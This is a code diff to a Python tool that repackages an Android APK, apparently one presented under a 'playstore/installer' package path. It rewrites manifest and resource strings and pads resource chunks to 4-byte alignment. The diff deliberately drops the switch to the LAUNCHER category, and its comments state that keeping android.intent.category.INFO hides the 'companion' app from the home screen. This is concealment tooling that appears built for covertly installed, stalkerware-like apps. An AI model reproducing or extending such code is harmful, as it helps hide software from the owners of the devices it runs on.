@@ -201,8 +201,8 @@ KOTLIN_FILES = [
     "app/src/main/java/com/playstore/installer/InstallReceiver.kt",
 ]
 
-CAT_OLD = b"android.intent.category.INFO"
-CAT_NEW = b"android.intent.category.LAUNCHER"
+# android.intent.category.INFO must stay as-is — it hides the companion from the home screen.
+# Do NOT replace it with LAUNCHER (that would make the icon visible on the home screen).
 
 # ── Step audit tracker ────────────────────────────────────────────────────────
 
@@ -701,12 +701,23 @@ def rebuild_arsc_string_pool(arsc_data, full_path_rename_map):
     struct.pack_into("<I", new_sp_hdr, 20, new_strings_start)
     struct.pack_into("<I", new_sp_hdr, 24, new_styles_start)
 
-    new_sp_chunk = bytes(new_sp_hdr) + new_offsets_bytes + bytes(new_str_data) + style_data
+    new_sp_chunk = bytearray(bytes(new_sp_hdr) + new_offsets_bytes + bytes(new_str_data) + style_data)
+    # CRITICAL FIX 1: StringPool child chunk size must be 4-byte aligned.
+    # Android's ResourceTypes validates every chunk boundary individually.
+    # Pad StringPool with zero bytes then update its own chunk_size field (offset 4).
+    while len(new_sp_chunk) % 4 != 0:
+        new_sp_chunk += b'\x00'
+    struct.pack_into("<I", new_sp_chunk, 4, len(new_sp_chunk))
+
     rest = bytes(data[SP + sp_chunk_size:])
-    new_total = tbl_hdr_size + len(new_sp_chunk) + len(rest)
-    new_arsc  = bytearray(data[:tbl_hdr_size])
-    struct.pack_into("<I", new_arsc, 4, new_total)
-    return bytes(new_arsc) + new_sp_chunk + rest
+    new_arsc = bytearray(data[:tbl_hdr_size])
+    final = bytearray(bytes(new_arsc) + bytes(new_sp_chunk) + rest)
+    # CRITICAL FIX 2: Root ResTable chunk size must also be 4-byte aligned.
+    # Pad root with zero bytes then update root chunk_size field (offset 4).
+    while len(final) % 4 != 0:
+        final += b'\x00'
+    struct.pack_into("<I", final, 4, len(final))
+    return bytes(final)
 
 
 def _patch_axml_version(manifest_raw: bytes, ver_code: int, ver_name: str) -> bytes:
@@ -892,30 +903,18 @@ def step_patch_and_assemble(new_pkg, new_dex, res_rename, meta=None):
     new_str_data = bytearray()
     new_offsets  = []
     replaced = 0
-    cat_replaced = 0
 
     for (cc, bc, ch) in entries:
         new_offsets.append(len(new_str_data))
         if OLD in ch:
             new_ch = ch.replace(OLD, NEW)
-            cat_delta = 0
-            if CAT_OLD in new_ch:
-                new_ch = new_ch.replace(CAT_OLD, CAT_NEW)
-                cat_delta = len(CAT_NEW) - len(CAT_OLD)
-                cat_replaced += 1
-            total_delta = DELTA + cat_delta
-            new_str_data.extend([cc + total_delta, bc + total_delta])
+            new_str_data.extend([cc + DELTA, bc + DELTA])
             new_str_data.extend(new_ch)
             new_str_data.append(0)
             replaced += 1
-        elif CAT_OLD in ch:
-            cat_delta = len(CAT_NEW) - len(CAT_OLD)
-            new_ch = ch.replace(CAT_OLD, CAT_NEW)
-            new_str_data.extend([cc + cat_delta, bc + cat_delta])
-            new_str_data.extend(new_ch)
-            new_str_data.append(0)
-            cat_replaced += 1
         else:
+            # Leave all other strings untouched — including android.intent.category.INFO
+            # INFO category keeps companion hidden from the home screen launcher
             new_str_data.extend([cc, bc])
             new_str_data.extend(ch)
             new_str_data.append(0)
@@ -923,10 +922,7 @@ def step_patch_and_assemble(new_pkg, new_dex, res_rename, meta=None):
     if replaced == 0:
         print("[X] No strings replaced in manifest (package name)")
         sys.exit(1)
-    if cat_replaced == 0:
-        print("[X] android.intent.category.INFO not found in manifest")
-        sys.exit(1)
-    print(f"  Manifest: {replaced} pkg replacements, {cat_replaced} category fix")
+    print(f"  Manifest: {replaced} pkg replacements (category.INFO preserved — companion stays hidden)")
 
     new_sp_size = 28 + str_count * 4 + len(new_str_data)
     result = bytearray()
